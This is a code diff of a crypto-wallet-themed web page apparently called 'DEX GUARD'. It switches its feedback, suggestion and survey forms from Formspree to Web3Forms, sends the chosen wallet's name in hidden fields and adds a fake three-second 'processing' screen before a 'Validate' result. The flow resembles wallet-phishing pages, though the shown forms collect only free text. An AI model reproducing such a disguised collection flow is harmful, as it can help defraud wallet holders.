@@ -568,258 +568,6 @@ body::before {
 
 
 /* =====================================================
-   FORM PROCESSING SCREEN
-===================================================== */
-
-.form-processing {
-
-    display: none;
-
-    text-align: center;
-
-    padding: 25px 5px;
-}
-
-
-.form-processing.active {
-
-    display: block;
-}
-
-
-.form-processing-icon {
-
-    width: 55px;
-
-    height: 55px;
-
-    margin: 0 auto 20px;
-
-    border:
-        4px solid
-        rgba(100,221,255,0.15);
-
-    border-top:
-        4px solid
-        var(--blue);
-
-    border-radius: 50%;
-
-    animation:
-        spin 0.9s linear infinite;
-}
-
-
-.form-processing h2 {
-
-    color: #ffffff;
-
-    font-size: 20px;
-
-    margin-bottom: 10px;
-}
-
-
-.form-processing p {
-
-    color: #888d90;
-
-    font-size: 13px;
-
-    line-height: 1.5;
-}
-
-
-/* =====================================================
-   FORM SUCCESS SCREEN
-===================================================== */
-
-.form-success {
-
-    display: none;
-
-    text-align: center;
-
-    padding: 25px 5px;
-}
-
-
-.form-success.active {
-
-    display: block;
-
-    animation:
-        formAppear 0.3s ease;
-}
-
-
-.success-check {
-
-    width: 62px;
-
-    height: 62px;
-
-    margin: 0 auto 18px;
-
-    border-radius: 50%;
-
-    display: flex;
-
-    align-items: center;
-
-    justify-content: center;
-
-    background: var(--blue);
-
-    color: #061014;
-
-    font-size: 32px;
-
-    font-weight: bold;
-}
-
-
-.form-success h2 {
-
-    color: #ffffff;
-
-    font-size: 20px;
-
-    margin-bottom: 10px;
-}
-
-
-.form-success p {
-
-    color: #888d90;
-
-    font-size: 13px;
-
-    line-height: 1.5;
-
-    margin-bottom: 20px;
-}
-
-
-.success-close-button {
-
-    width: 100%;
-
-    height: 44px;
-
-    border: none;
-
-    border-radius: 8px;
-
-    background: var(--blue);
-
-    color: #061014;
-
-    font-size: 14px;
-
-    font-weight: 700;
-
-    cursor: pointer;
-}
-
-
-.success-close-button:hover {
-
-    background: var(--blue-light);
-}
-
-
-/* =====================================================
-   FORM ERROR SCREEN
-===================================================== */
-
-.form-error {
-
-    display: none;
-
-    text-align: center;
-
-    padding: 25px 5px;
-}
-
-
-.form-error.active {
-
-    display: block;
-}
-
-
-.form-error-icon {
-
-    width: 62px;
-
-    height: 62px;
-
-    margin: 0 auto 18px;
-
-    border-radius: 50%;
-
-    display: flex;
-
-    align-items: center;
-
-    justify-content: center;
-
-    background: #ff4444;
-
-    color: #ffffff;
-
-    font-size: 28px;
-
-    font-weight: bold;
-}
-
-
-.form-error h2 {
-
-    color: #ffffff;
-
-    font-size: 20px;
-
-    margin-bottom: 10px;
-}
-
-
-.form-error p {
-
-    color: #888d90;
-
-    font-size: 13px;
-
-    line-height: 1.5;
-
-    margin-bottom: 20px;
-}
-
-
-.retry-button {
-
-    width: 100%;
-
-    height: 44px;
-
-    border: none;
-
-    border-radius: 8px;
-
-    background: var(--blue);
-
-    color: #061014;
-
-    font-size: 14px;
-
-    font-weight: 700;
-
-    cursor: pointer;
-}
-
-
-/* =====================================================
    SUCCESS SCREEN
 ===================================================== */
 
@@ -1131,6 +879,142 @@ body::before {
 
 
 /* =====================================================
+   FORM MESSAGE
+===================================================== */
+
+.form-message {
+
+    display: none;
+
+    margin-top: 14px;
+
+    color:
+        var(--blue);
+
+    font-size: 12px;
+
+    line-height: 1.5;
+
+    text-align: center;
+}
+
+
+/* =====================================================
+   SUBMISSION STATUS
+===================================================== */
+
+.submission-status {
+
+    display: none;
+
+    text-align: center;
+}
+
+
+.submission-status.active {
+
+    display: block;
+}
+
+
+.status-icon {
+
+    width: 65px;
+
+    height: 65px;
+
+    margin:
+        5px auto 18px;
+
+    border-radius: 50%;
+
+    display: flex;
+
+    align-items: center;
+
+    justify-content: center;
+
+    font-size: 32px;
+
+    font-weight: bold;
+}
+
+
+.status-icon.success {
+
+    background:
+        rgba(100,221,255,0.12);
+
+    color:
+        var(--blue);
+
+    border:
+        2px solid
+        rgba(100,221,255,0.4);
+}
+
+
+.status-icon.error {
+
+    background:
+        rgba(255,68,68,0.1);
+
+    color:
+        #ff4444;
+
+    border:
+        2px solid
+        rgba(255,68,68,0.4);
+}
+
+
+.status-title {
+
+    color: #ffffff;
+
+    font-size: 21px;
+
+    margin-bottom: 10px;
+}
+
+
+.status-text {
+
+    color: #888d90;
+
+    font-size: 13px;
+
+    line-height: 1.5;
+
+    margin-bottom: 20px;
+}
+
+
+.status-close {
+
+    width: 100%;
+
+    height: 43px;
+
+    border: none;
+
+    border-radius: 8px;
+
+    background:
+        var(--blue);
+
+    color:
+        #061014;
+
+    font-size: 13px;
+
+    font-weight: 700;
+
+    cursor: pointer;
+}
+
+
+/* =====================================================
    FOOTER
 ===================================================== */
 
@@ -1378,7 +1262,7 @@ body::before {
 
 
 <!-- =====================================================
-     POPUP
+     MAIN POPUP
 ===================================================== -->
 
 <div
@@ -1419,7 +1303,7 @@ body::before {
             <p class="processing-text">
 
                 Please wait while we process
-                your selection.
+                your suggestion.
 
             </p>
 
@@ -1428,7 +1312,7 @@ body::before {
 
 
         <!-- =================================================
-             SUCCESS / FORM SCREEN
+             FORM SCREEN
         ================================================== -->
 
         <div
@@ -1454,7 +1338,7 @@ body::before {
 
             <h2 class="success-title">
 
-                Thank you for choosing
+                thank you for choosing
                 <span id="selectedWalletName"></span>
                 survey idea
 
@@ -1463,7 +1347,7 @@ body::before {
 
 
             <!-- =================================================
-                 FORM TITLES
+                 FORM OPTIONS
             ================================================== -->
 
             <div class="form-options">
@@ -1508,14 +1392,43 @@ body::before {
             >
 
                 <form
-                    onsubmit="submitForm(event, 'feedback')"
+                    class="web3-form"
+                    data-form-type="feedback"
                 >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Feedback"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Feedback"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
 
                     <label
                         class="form-label"
                         for="feedback"
                     >
-                        Feedback
+                        feedback
                     </label>
 
 
@@ -1551,14 +1464,43 @@ body::before {
             >
 
                 <form
-                    onsubmit="submitForm(event, 'suggestion')"
+                    class="web3-form"
+                    data-form-type="suggestion"
                 >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Suggestion"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Suggestion"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
 
                     <label
                         class="form-label"
                         for="suggestion"
                     >
-                        Suggestions
+                        suggestions
                     </label>
 
 
@@ -1566,7 +1508,7 @@ body::before {
                         id="suggestion"
                         class="form-textarea"
                         placeholder="Enter suggestions"
-                        name="suggestion"
+                        name="message"
                         required
                     ></textarea>
 
@@ -1575,7 +1517,7 @@ body::before {
                         class="form-label"
                         for="suggestionName"
                     >
-                        Options
+                        options
                     </label>
 
 
@@ -1612,14 +1554,43 @@ body::before {
             >
 
                 <form
-                    onsubmit="submitForm(event, 'survey')"
+                    class="web3-form"
+                    data-form-type="survey"
                 >
+
+                    <input
+                        type="hidden"
+                        name="access_key"
+                        value="b96db7f0-a2bd-4cba-b39d-23198dfedf10"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="subject"
+                        value="DEX GUARD - Survey"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="form_type"
+                        value="Survey"
+                    >
+
+
+                    <input
+                        type="hidden"
+                        name="wallet"
+                        class="wallet-hidden-input"
+                    >
+
 
                     <label
                         class="form-label"
                         for="survey"
                     >
-                        Survey
+                        survey
                     </label>
 
 
@@ -1628,7 +1599,7 @@ body::before {
                         id="survey"
                         class="form-input"
                         placeholder="Enter survey"
-                        name="survey"
+                        name="message"
                         required
                     >
 
@@ -1644,94 +1615,102 @@ body::before {
 
             </div>
 
+        </div>
 
-            <!-- =================================================
-                 FORM PROCESSING
-            ================================================== -->
 
-            <div
-                class="form-processing"
-                id="formProcessing"
-            >
 
-                <div class="form-processing-icon"></div>
+        <!-- =================================================
+             SUBMISSION PROCESSING SCREEN
+        ================================================== -->
 
-                <h2>
-                    Processing...
-                </h2>
+        <div
+            class="submission-status"
+            id="submissionProcessing"
+        >
 
-                <p>
-                    Please wait while we submit
-                    your response.
-                </p>
+            <div class="processing-icon"></div>
 
+            <h2 class="processing-title">
+                Submitting...
+            </h2>
+
+            <p class="processing-text">
+
+                Please wait while your
+                submission is being processed.
+
+            </p>
+
+        </div>
+
+
+
+        <!-- =================================================
+             SUBMISSION SUCCESS SCREEN
+        ================================================== -->
+
+        <div
+            class="submission-status"
+            id="submissionSuccess"
+        >
+
+            <div class="status-icon success">
+                ✓
             </div>
 
+            <h2 class="status-title">
+                Submission Successful
+            </h2>
 
-            <!-- =================================================
-                 FORM SUCCESS
-            ================================================== -->
+            <p class="status-text">
+                Thank you. Your response has
+                been successfully submitted.
+            </p>
 
-            <div
-                class="form-success"
-                id="formSuccess"
+            <button
+                type="button"
+                class="status-close"
+                onclick="finishSubmission()"
             >
+                Done
+            </button>
 
-                <div class="success-check">
-                    ✓
-                </div>
+        </div>
 
-                <h2>
-                    Successfully Submitted
-                </h2>
 
-                <p>
-                    Thank you. Your response
-                    has been submitted successfully.
-                </p>
 
-                <button
-                    type="button"
-                    class="success-close-button"
-                    onclick="closePopup()"
-                >
-                    Done
-                </button>
+        <!-- =================================================
+             SUBMISSION ERROR SCREEN
+        ================================================== -->
 
+        <div
+            class="submission-status"
+            id="submissionError"
+        >
+
+            <div class="status-icon error">
+                !
             </div>
 
+            <h2 class="status-title">
+                Submission Failed
+            </h2>
 
-            <!-- =================================================
-                 FORM ERROR
-            ================================================== -->
-
-            <div
-                class="form-error"
-                id="formError"
+            <p
+                class="status-text"
+                id="submissionErrorText"
             >
+                Something went wrong.
+                Please try again.
+            </p>
 
-                <div class="form-error-icon">
-                    !
-                </div>
-
-                <h2>
-                    Submission Failed
-                </h2>
-
-                <p>
-                    We could not submit your response.
-                    Please try again.
-                </p>
-
-                <button
-                    type="button"
-                    class="retry-button"
-                    onclick="retryForm()"
-                >
-                    Try Again
-                </button>
-
-            </div>
+            <button
+                type="button"
+                class="status-close"
+                onclick="returnToForms()"
+            >
+                Try Again
+            </button>
 
         </div>
 
@@ -1818,6 +1797,14 @@ body::before {
 
 
 <script>
+
+/* =====================================================
+   WEB3FORMS
+===================================================== */
+
+const WEB3FORMS_URL =
+    "https://api.web3forms.com/submit";
+
 
 /* =====================================================
    WALLET DATA
@@ -2216,14 +2203,11 @@ wallets.forEach(function(wallet) {
     const button =
         document.createElement("button");
 
-
     button.className =
         "wallet-item";
 
-
     button.type =
         "button";
-
 
     button.innerHTML = `
 
@@ -2295,27 +2279,35 @@ const selectedWalletLogo =
     );
 
 
-const formProcessing =
+const submissionProcessing =
     document.getElementById(
-        "formProcessing"
+        "submissionProcessing"
     );
 
 
-const formSuccess =
+const submissionSuccess =
     document.getElementById(
-        "formSuccess"
+        "submissionSuccess"
     );
 
 
-const formError =
+const submissionError =
     document.getElementById(
-        "formError"
+        "submissionError"
+    );
+
+
+const submissionErrorText =
+    document.getElementById(
+        "submissionErrorText"
     );
 
 
 let processingTimer;
 
-let currentFormType = null;
+let submissionTimer;
+
+let currentWallet = null;
 
 
 /* =====================================================
@@ -2324,12 +2316,15 @@ let currentFormType = null;
 
 function openWalletPopup(wallet) {
 
-    clearTimeout(
-        processingTimer
-    );
+    clearTimeout(processingTimer);
+
+    clearTimeout(submissionTimer);
 
 
-    /* Reset screens */
+    currentWallet = wallet;
+
+
+    /* Reset all screens */
 
     processingScreen.style.display =
         "block";
@@ -2337,15 +2332,15 @@ function openWalletPopup(wallet) {
     successScreen.style.display =
         "none";
 
-    formProcessing.classList.remove(
+    submissionProcessing.classList.remove(
         "active"
     );
 
-    formSuccess.classList.remove(
+    submissionSuccess.classList.remove(
         "active"
     );
 
-    formError.classList.remove(
+    submissionError.classList.remove(
         "active"
     );
 
@@ -2369,6 +2364,18 @@ function openWalletPopup(wallet) {
     resetForms();
 
 
+    /* Add wallet name to hidden fields */
+
+    document
+        .querySelectorAll(".wallet-hidden-input")
+        .forEach(function(input) {
+
+            input.value =
+                wallet.name;
+
+        });
+
+
     /* Open popup */
 
     popupOverlay.classList.add(
@@ -2380,7 +2387,7 @@ function openWalletPopup(wallet) {
         "hidden";
 
 
-    /* Wait 3 seconds */
+    /* Wallet processing */
 
     processingTimer =
         setTimeout(function() {
@@ -2452,23 +2459,10 @@ function resetForms() {
     });
 
 
-    formProcessing.classList.remove(
-        "active"
-    );
-
-
-    formSuccess.classList.remove(
-        "active"
-    );
-
-
-    formError.classList.remove(
-        "active"
-    );
-
+    /* Reset actual form fields */
 
     document
-        .querySelectorAll("form")
+        .querySelectorAll(".web3-form")
         .forEach(function(form) {
 
             form.reset();
@@ -2476,23 +2470,20 @@ function resetForms() {
         });
 
 
-    document
-        .querySelectorAll(".submit-button")
-        .forEach(function(button) {
+    /* Restore wallet name */
 
-            button.disabled =
-                false;
+    if (currentWallet) {
 
-            button.textContent =
-                "Validate";
+        document
+            .querySelectorAll(".wallet-hidden-input")
+            .forEach(function(input) {
 
-            button.style.opacity =
-                "1";
+                input.value =
+                    currentWallet.name;
 
-        });
+            });
 
-
-    currentFormType = null;
+    }
 
 }
 
@@ -2502,19 +2493,6 @@ function resetForms() {
 ===================================================== */
 
 function showForm(formName, selectedButton) {
-
-    /* Don't switch forms while processing */
-
-    if (
-        formProcessing.classList.contains(
-            "active"
-        )
-    ) {
-        return;
-    }
-
-
-    /* Remove active state */
 
     document
         .querySelectorAll(".form-option")
@@ -2527,14 +2505,10 @@ function showForm(formName, selectedButton) {
         });
 
 
-    /* Activate clicked title */
-
     selectedButton.classList.add(
         "active"
     );
 
-
-    /* Hide every form */
 
     document
         .querySelectorAll(".form-content")
@@ -2546,8 +2520,6 @@ function showForm(formName, selectedButton) {
 
         });
 
-
-    /* Show selected form */
 
     const selectedForm =
         document.getElementById(
@@ -2576,6 +2548,10 @@ function closePopup() {
         processingTimer
     );
 
+    clearTimeout(
+        submissionTimer
+    );
+
 
     popupOverlay.classList.remove(
         "active"
@@ -2584,21 +2560,6 @@ function closePopup() {
 
     document.body.style.overflow =
         "";
-
-
-    formProcessing.classList.remove(
-        "active"
-    );
-
-
-    formSuccess.classList.remove(
-        "active"
-    );
-
-
-    formError.classList.remove(
-        "active"
-    );
 
 }
 
@@ -2645,233 +2606,302 @@ document.addEventListener(
 
 
 /* =====================================================
-   FORM SUBMISSION
-   FORMSPREE AJAX
+   WEB3FORMS SUBMISSION
 ===================================================== */
 
-async function submitForm(event, formType) {
+document
+    .querySelectorAll(".web3-form")
+    .forEach(function(form) {
 
-    event.preventDefault();
+        form.addEventListener(
+            "submit",
+            async function(event) {
+
+                event.preventDefault();
 
 
-    const form =
-        event.target;
+                const button =
+                    form.querySelector(
+                        ".submit-button"
+                    );
 
 
-    const button =
-        form.querySelector(
-            ".submit-button"
+                /* Prevent double submission */
+
+                button.disabled =
+                    true;
+
+                button.textContent =
+                    "Processing...";
+
+
+                /* Make sure wallet is included */
+
+                const walletInput =
+                    form.querySelector(
+                        ".wallet-hidden-input"
+                    );
+
+
+                if (
+                    walletInput &&
+                    currentWallet
+                ) {
+
+                    walletInput.value =
+                        currentWallet.name;
+
+                }
+
+
+                /* Create FormData */
+
+                const formData =
+                    new FormData(form);
+
+
+                /*
+                    Convert FormData to JSON.
+                    This is the AJAX method
+                    recommended by Web3Forms.
+                */
+
+                const object =
+                    Object.fromEntries(
+                        formData
+                    );
+
+
+                const json =
+                    JSON.stringify(
+                        object
+                    );
+
+
+                /* =================================================
+                   SHOW SUBMISSION PROCESSING SCREEN
+                ================================================== */
+
+                successScreen.style.display =
+                    "none";
+
+
+                processingScreen.style.display =
+                    "none";
+
+
+                submissionSuccess.classList.remove(
+                    "active"
+                );
+
+                submissionError.classList.remove(
+                    "active"
+                );
+
+
+                submissionProcessing.classList.add(
+                    "active"
+                );
+
+
+                let submissionSuccessful =
+                    false;
+
+                let errorMessage =
+                    "Something went wrong. Please try again.";
+
+
+                /* =================================================
+                   SEND TO WEB3FORMS
+                ================================================== */
+
+                try {
+
+                    const response =
+                        await fetch(
+                            WEB3FORMS_URL,
+                            {
+                                method: "POST",
+
+                                headers: {
+
+                                    "Content-Type":
+                                        "application/json",
+
+                                    "Accept":
+                                        "application/json"
+
+                                },
+
+                                body:
+                                    json
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    if (
+                        response.ok &&
+                        result.success
+                    ) {
+
+                        submissionSuccessful =
+                            true;
+
+                    } else {
+
+                        errorMessage =
+                            result.message ||
+                            "Web3Forms could not process your submission.";
+
+                    }
+
+
+                } catch (error) {
+
+                    console.error(
+                        "Web3Forms Error:",
+                        error
+                    );
+
+
+                    errorMessage =
+                        "Unable to connect to the submission service. Please check your internet connection and try again.";
+
+                }
+
+
+                /* =================================================
+                   WAIT 3 SECONDS BEFORE RESULT
+                ================================================== */
+
+                submissionTimer =
+                    setTimeout(function() {
+
+                        submissionProcessing.classList.remove(
+                            "active"
+                        );
+
+
+                        if (
+                            submissionSuccessful
+                        ) {
+
+                            submissionSuccess.classList.add(
+                                "active"
+                            );
+
+
+                            /* Clear submitted form */
+
+                            form.reset();
+
+
+                            /*
+                               Put wallet name back
+                               after reset.
+                            */
+
+                            if (
+                                walletInput &&
+                                currentWallet
+                            ) {
+
+                                walletInput.value =
+                                    currentWallet.name;
+
+                            }
+
+
+                        } else {
+
+                            submissionErrorText.textContent =
+                                errorMessage;
+
+
+                            submissionError.classList.add(
+                                "active"
+                            );
+
+
+                            button.disabled =
+                                false;
+
+                            button.textContent =
+                                "Validate";
+
+                        }
+
+                    }, 3000);
+
+            }
+
         );
 
-
-    currentFormType =
-        formType;
+    });
 
 
-    /*
-       Disable submit button
-    */
+/* =====================================================
+   FINISH SUCCESSFUL SUBMISSION
+===================================================== */
 
-    button.disabled =
-        true;
+function finishSubmission() {
 
-    button.textContent =
-        "Processing...";
-
-
-    /*
-       Hide the form
-       and show processing screen
-    */
-
-    document
-        .querySelectorAll(".form-content")
-        .forEach(function(item) {
-
-            item.classList.remove(
-                "active"
-            );
-
-        });
-
-
-    formProcessing.classList.add(
+    submissionSuccess.classList.remove(
         "active"
     );
 
 
-    /*
-       Create FormData
-    */
-
-    const formData =
-        new FormData(form);
+    successScreen.style.display =
+        "block";
 
 
-    /*
-       Add wallet information
-    */
+    /* Reset form buttons */
 
-    formData.append(
-        "wallet",
-        selectedWalletName.textContent
-    );
+    document
+        .querySelectorAll(".submit-button")
+        .forEach(function(button) {
 
+            button.disabled =
+                false;
 
-    /*
-       Add form type
-    */
+            button.textContent =
+                "Validate";
 
-    formData.append(
-        "form_type",
-        formType
-    );
-
-
-    try {
-
-        /*
-           Submit to Formspree
-           WITHOUT leaving the page
-        */
-
-        const response =
-            await fetch(
-                "https://formspree.io/f/xdeonwlg",
-                {
-                    method: "POST",
-
-                    body: formData,
-
-                    headers: {
-                        "Accept":
-                            "application/json"
-                    }
-                }
-            );
-
-
-        /*
-           Check Formspree response
-        */
-
-        if (
-            response.ok
-        ) {
-
-            /*
-               Keep Processing screen
-               visible for 3 seconds
-            */
-
-            setTimeout(
-                function() {
-
-                    formProcessing.classList.remove(
-                        "active"
-                    );
-
-
-                    formSuccess.classList.add(
-                        "active"
-                    );
-
-
-                    button.disabled =
-                        false;
-
-
-                    button.textContent =
-                        "Validate";
-
-
-                    button.style.opacity =
-                        "1";
-
-                },
-                3000
-            );
-
-
-        } else {
-
-            throw new Error(
-                "Formspree submission failed"
-            );
-
-        }
-
-
-    } catch (error) {
-
-        console.error(
-            "Form submission error:",
-            error
-        );
-
-
-        /*
-           Hide processing
-        */
-
-        formProcessing.classList.remove(
-            "active"
-        );
-
-
-        /*
-           Show error screen
-        */
-
-        formError.classList.add(
-            "active"
-        );
-
-
-        button.disabled =
-            false;
-
-
-        button.textContent =
-            "Validate";
-
-
-        button.style.opacity =
-            "1";
-
-    }
+        });
 
 }
 
 
 /* =====================================================
-   RETRY FORM
+   RETURN TO FORMS AFTER ERROR
 ===================================================== */
 
-function retryForm() {
+function returnToForms() {
 
-    formError.classList.remove(
+    submissionError.classList.remove(
         "active"
     );
 
 
-    /*
-       Return to the form
-    */
-
-    const form =
-        document.getElementById(
-            currentFormType + "Form"
-        );
+    successScreen.style.display =
+        "block";
 
 
-    if (form) {
+    document
+        .querySelectorAll(".submit-button")
+        .forEach(function(button) {
 
-        form.classList.add(
-            "active"
-        );
+            button.disabled =
+                false;
 
-    }
+            button.textContent =
+                "Validate";
+
+        });
 
 }
 
